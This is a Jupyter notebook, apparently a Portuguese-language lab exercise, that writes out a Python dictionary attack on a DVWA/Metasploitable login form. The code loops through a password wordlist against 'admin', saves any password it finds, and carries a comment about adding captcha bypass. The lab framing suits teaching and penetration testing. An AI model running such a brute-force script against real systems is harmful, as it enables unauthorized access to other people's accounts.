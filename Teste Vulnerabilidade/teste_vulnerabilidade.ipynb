{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Script completo em: https://leandrolessa.com.br/tutoriais/ataque-cibernetico-crie-seu-proprio-teste-de-vulnerabilidade/\n",
    "\n",
    "MecanicalSoup\n",
    "https://mechanicalsoup.readthedocs.io/en/stable/tutorial.html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting mechanicalsoup\n",
      "  Downloading MechanicalSoup-1.3.0-py3-none-any.whl.metadata (6.0 kB)\n",
      "Collecting requests>=2.22.0 (from mechanicalsoup)\n",
      "  Downloading requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)\n",
      "Collecting beautifulsoup4>=4.7 (from mechanicalsoup)\n",
      "  Downloading beautifulsoup4-4.12.3-py3-none-any.whl.metadata (3.8 kB)\n",
      "Collecting lxml (from mechanicalsoup)\n",
      "  Downloading lxml-5.3.0-cp313-cp313-win_amd64.whl.metadata (3.9 kB)\n",
      "Collecting soupsieve>1.2 (from beautifulsoup4>=4.7->mechanicalsoup)\n",
      "  Downloading soupsieve-2.6-py3-none-any.whl.metadata (4.6 kB)\n",
      "Collecting charset-normalizer<4,>=2 (from requests>=2.22.0->mechanicalsoup)\n",
      "  Downloading charset_normalizer-3.4.0-cp313-cp313-win_amd64.whl.metadata (34 kB)\n",
      "Collecting idna<4,>=2.5 (from requests>=2.22.0->mechanicalsoup)\n",
      "  Downloading idna-3.10-py3-none-any.whl.metadata (10 kB)\n",
      "Collecting urllib3<3,>=1.21.1 (from requests>=2.22.0->mechanicalsoup)\n",
      "  Downloading urllib3-2.2.3-py3-none-any.whl.metadata (6.5 kB)\n",
      "Collecting certifi>=2017.4.17 (from requests>=2.22.0->mechanicalsoup)\n",
      "  Downloading certifi-2024.12.14-py3-none-any.whl.metadata (2.3 kB)\n",
      "Downloading MechanicalSoup-1.3.0-py3-none-any.whl (19 kB)\n",
      "Downloading beautifulsoup4-4.12.3-py3-none-any.whl (147 kB)\n",
      "Downloading requests-2.32.3-py3-none-any.whl (64 kB)\n",
      "Downloading lxml-5.3.0-cp313-cp313-win_amd64.whl (3.8 MB)\n",
      "   ---------------------------------------- 0.0/3.8 MB ? eta -:--:--\n",
      "   ---------------- ----------------------- 1.6/3.8 MB 8.6 MB/s eta 0:00:01\n",
      "   ----------------------------------- ---- 3.4/3.8 MB 9.0 MB/s eta 0:00:01\n",
      "   ---------------------------------------- 3.8/3.8 MB 8.6 MB/s eta 0:00:00\n",
      "Downloading certifi-2024.12.14-py3-none-any.whl (164 kB)\n",
      "Downloading charset_normalizer-3.4.0-cp313-cp313-win_amd64.whl (102 kB)\n",
      "Downloading idna-3.10-py3-none-any.whl (70 kB)\n",
      "Downloading soupsieve-2.6-py3-none-any.whl (36 kB)\n",
      "Downloading urllib3-2.2.3-py3-none-any.whl (126 kB)\n",
      "Installing collected packages: urllib3, soupsieve, lxml, idna, charset-normalizer, certifi, requests, beautifulsoup4, mechanicalsoup\n",
      "Successfully installed beautifulsoup4-4.12.3 certifi-2024.12.14 charset-normalizer-3.4.0 idna-3.10 lxml-5.3.0 mechanicalsoup-1.3.0 requests-2.32.3 soupsieve-2.6 urllib3-2.2.3\n"
     ]
    }
   ],
   "source": [
    "!pip install mechanicalsoup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Importando a biblioteca"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import mechanicalsoup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Instanciando objeto\n",
    "Doc: https://mechanicalsoup.readthedocs.io/en/stable/tutorial.html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "browser = mechanicalsoup.StatefulBrowser()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " !!!!! Daqui pra frente não foi executado, necessário rodar a metasplitable local abrindo pelo browser"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "site = 'caminho_do_site/ip_da_vítima'\n",
    "user = 'admin'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Acessando site"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "browser.open(site)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Coletando lista passwords (datasets)\n",
    "(baixar do site - fasttrack)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "arquivo = './src do dataset'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open (arquivo, 'r') as f:\n",
    "    lista_passwords = f.readlines()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for senha in lista_passwords:\n",
    "    print(f'acessando a senha: {senha.strip()}')\n",
    "    # strip p/ tirar espaços vazios/quebra de lihas"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "len(lista_passwords)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Função para salvar senha"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def gerar_arquivo_senha(usuario, senha):\n",
    "    arquivo = './senha_encontrada.txt'\n",
    "\n",
    "    with open (arquivo, 'w') as file:\n",
    "        file.write(f'Usuario encontrado: {usuario}\\n')\n",
    "        file.write(f'Senha encontrada: {senha}')\n",
    "\n",
    "    print(f'A senha encontrada foi salva em {arquivo}')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Criando função de avaliação\n",
    "(inspecionar campos da tela de login - usuario, senha, botao submit)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def busca_vulnerabilidade():\n",
    "    num_senha = 0\n",
    "    for senha in lista_passwords:\n",
    "        num_senha += 1\n",
    "        # tag form\n",
    "        browser.select_form('form[action=\"login.php\"]')\n",
    "        # classes dos componentes\n",
    "        browser['username'] = user\n",
    "        browser['password'] = senha.strip()\n",
    "        # botao submit\n",
    "        browser.submit_selected()\n",
    "\n",
    "        # implementar leitura de captcha com lib própria, e sleep para aguardar\n",
    "\n",
    "        # checa se a url mudou (acessou), \n",
    "        # no DVWA (metasploitable) o login quando não acessar volta para a página de login\n",
    "        resposta_acesso_site = browser.get_url()\n",
    "\n",
    "        if (resposta_acesso_site != site):\n",
    "            print(f'''\n",
    "                Foi encontrado a vulnerabilidade no site: {resposta_acesso_site}\n",
    "                A senha encontrada foi: {senha}\n",
    "            ''')\n",
    "            gerar_arquivo_senha(usuario=user, senha=senha)\n",
    "            # parar script para não consumir mais maquina após acertar a senha\n",
    "            break\n",
    "        else:\n",
    "            print(f'''\n",
    "                Acessando a url: {resposta_acesso_site}\n",
    "                Posição da senha {num_senha} - testando a senha {senha}\n",
    "            ''')\n",
    "        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Acompanhar os logs da metasploitable antes e durante o ataque"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
